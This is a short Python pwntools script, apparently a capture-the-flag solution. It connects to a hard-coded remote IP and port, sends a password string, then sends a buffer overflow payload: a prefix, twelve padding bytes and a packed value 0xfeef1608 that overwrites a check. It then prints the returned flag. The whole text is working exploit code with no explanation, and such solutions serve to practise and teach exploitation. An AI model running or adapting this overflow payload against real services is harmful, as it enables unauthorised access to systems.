from pwn import *

connect = remote('159.65.13.76', 63002)
x = connect.recvline()
x = connect.recvline()
print(x)
payload1 = b"Only-C"
connect.sendline(payload1) 
x = connect.recvline()

payload2 = b"LoveM-TP" + b"A" * 12 + p32(0xfeef1608)
connect.sendline(payload2)

connect.recvline()
flag = connect.recvline()
log.success("FLAG: ", flag)